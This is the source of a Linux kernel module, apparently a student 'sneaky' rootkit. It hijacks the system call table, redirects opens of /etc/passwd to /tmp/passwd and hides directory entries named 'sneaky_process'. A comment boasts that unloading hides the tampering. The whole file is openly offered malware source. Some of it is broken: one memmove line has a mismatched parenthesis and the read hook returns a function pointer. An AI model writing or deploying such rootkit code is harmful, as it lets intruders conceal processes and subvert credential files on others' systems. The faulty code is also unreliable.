#include <linux/module.h> // for all modules
#include <linux/init.h>   // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>    // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define PREFIX "sneaky_process"

// This is a pointer to the system call table
static unsigned long *sys_call_table;

MODULE_LICENSE("GPL");
char *sneaky_pid = "";
module_param(sneaky_pid, charp, 0000);
MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");

struct linux_dirent64 {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; 
	char		d_name[]; 
};

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW)
  {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

//-----------open-------------------
// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{

  if (strstr(regs->si, "/etc/passwd") != NULL)
  {
    // if (sig)
    printk(KERN_INFO "change to sneaky_sys_openat\n");
    copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}

//------------getdents64------------//
asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  int og_num = original_getdents64(fd, dirp, count); // num byte read
  if (og_num == 0)
  {
    return og_num;
  }
  if (og_num ==-1){
    printk("cannot operate original getdents64");
  }
  char *file = (char *)dirp;

  int i;
  for (i = 0; i < og_num;)
  {
    struct linux_dirent64 *curr_dirp = (struct linux_dirent64 *)(file + i);
    if (strncmp(curr_dirp->d_name, PREFIX, strlen(PREFIX)) == 0 ) //||strcmp(curr_dirp->d_name, sneaky_pid) == 0
    {
      printk(KERN_INFO "Sneaky_process being hide.\n");
      memmove((file + i, file + i + curr_dirp->d_reclen, og_num - (curr_dirp->d_reclen + i));
      og_num -= curr_dirp->d_reclen;
    }
    else{
      i+=curr_dirp->d_reclen;
    }
  }
  return og_num;
}

//--------read-----------//
asmlinkage int (*original_read)(unsigned int fd, void *buf, size_t count);

asmlinkage int sneaky_sys_read(unsigned int fd, void *buf, size_t count)
{
  return original_read;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
